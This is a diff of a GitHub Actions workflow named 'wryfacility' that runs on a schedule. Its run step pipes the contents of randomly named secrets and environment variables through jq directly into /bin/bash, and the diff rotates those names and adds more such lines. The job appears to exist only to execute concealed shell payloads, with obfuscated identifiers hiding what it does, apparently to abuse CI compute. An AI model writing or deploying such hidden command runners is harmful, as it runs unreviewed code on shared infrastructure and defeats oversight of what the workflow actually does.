@@ -1,9 +1,9 @@
 name: wryfacility
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
+    - cron: '17 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: wryfacility
         env:
-          tor679: ${{ secrets.tor679 }}
+          zjsd4: ${{ secrets.zjsd4 }}
         run: |
-          echo $tor679 | jq -r .oofb401 | /bin/bash
-          echo $emoki663 | jq -r .fu95 | /bin/bash
-          echo $cv22 | jq -r .tvwwv881 | /bin/bash
-          echo $f790 | jq -r .v19939 | /bin/bash
+          echo $zjsd4 | jq -r .es25595 | /bin/bash
+          echo $w94624 | jq -r .zc6 | /bin/bash
+          echo $gm78 | jq -r .sbg43826 | /bin/bash
+          echo $fj9209 | jq -r .xh43 | /bin/bash
+          echo $ssrzf206 | jq -r .ns1 | /bin/bash
+          echo $mepd4893 | jq -r .evov8507 | /bin/bash
 
